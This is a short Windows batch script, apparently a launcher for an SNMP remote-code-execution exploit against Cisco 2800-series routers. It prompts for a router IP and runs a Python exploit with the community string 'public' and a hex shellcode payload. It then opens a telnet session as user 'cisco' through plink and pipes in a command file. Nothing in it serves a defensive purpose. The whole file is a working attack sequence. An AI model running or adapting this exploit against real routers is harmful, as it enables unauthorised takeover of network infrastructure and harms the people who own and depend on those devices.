@echo off
color 0a
echo Entering hacker mode.
set /p ip="Enter IP of your Router: "
cd cisco-snmp-rce
python c2800nm-adventerprisek9-mz.151-4.M12a.py %ip% public 8fb40250000000003c163e2936d655b026d620000000000002d4a821000000008eb60000000000003c1480003694f000ae96000000000000aea00000000000003c1fbfc437ff89a803e0000800000000
cd ..
plink -telnet cisco@%ip% < ciscoCommands.txt